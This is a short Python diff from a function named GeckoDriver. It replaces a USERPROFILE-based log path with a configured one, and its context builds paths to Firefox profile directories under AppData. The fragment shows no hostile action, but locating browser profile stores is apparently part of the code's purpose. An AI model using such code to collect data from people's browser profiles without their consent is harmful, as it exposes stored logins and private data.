@@ -212,8 +212,7 @@ def GeckoDriver():
     msgInfo = ""
     Log("===========GeckoDriver===========")
     appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'
-    user = environ['USERPROFILE']
-    pathtofile = f'{user}\\{config.pathToLogs}'
+    pathtofile = config.pathToLogs
 
     browsers = {
         "firefox": appdata + "\\Mozilla\\Firefox\\Profiles",
